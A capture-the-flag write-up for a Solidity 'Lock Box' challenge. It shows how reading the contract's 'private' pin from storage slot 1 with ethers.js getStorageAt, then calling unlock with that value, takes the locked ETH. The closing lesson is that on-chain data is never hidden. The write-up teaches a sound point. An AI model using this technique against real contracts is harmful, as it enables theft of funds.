# Lock Box

# Problem Statement
### Description
```
Unlock the Safe
Just enter the correct pin

0.1 ETH locked away
----------------
|0|0|0|0|Unlock|
----------------
```

# Solution
First read about how [storage works in Solidity](https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html).<br>
Also know that we can always get the values of these slots by using web3js/ethersjs `getStorageAt` methods.
Lets now find all of the storage being used by searching for all of the contract state variables with the knowledge that `Lockbox1` inherits from `CtfFramework`.<br>

`CtfFramework` variables:
```
mapping(address => bool) internal authorizedToPlay; // slot 0
```
`Lockbox1` variables:
```
uint256 private pin; // slot 1
```
Because `Lockbox1` inherits from `CtfFramework` slot 0 goes to `authorizedToPlay` and slot 1 goes to `pin`. Now that we know where the values are stored lets use `getStorageAt`. We'll be using ethersjs here:
```
const contractAddress = // Lockbox contract address
const result = await ethers.provider.getStorageAt(contractAddress, 1);
console.log(parseInt(result)); // need to parse to int as the value is stored in hexidecimal
```
That should return the code so all we need to do now is to call the `Lockbox1` `unlock` function with the it. The website has an interface where you can put in the code but we are using ethersjs here:
```
const eoa = // Your address
const abi = // Lockbox abi
const code = // Code from above
const contract = new ethers.Contract(contractAddress, abi, eoa);
const tx = await contract.unlock(8500);
```

We've completed this lesson!

# Key Learnings
- Nothing is truly hidden in the blockchain. If have to store private information make sure to encrypt it prior to storing it on the blockchain.
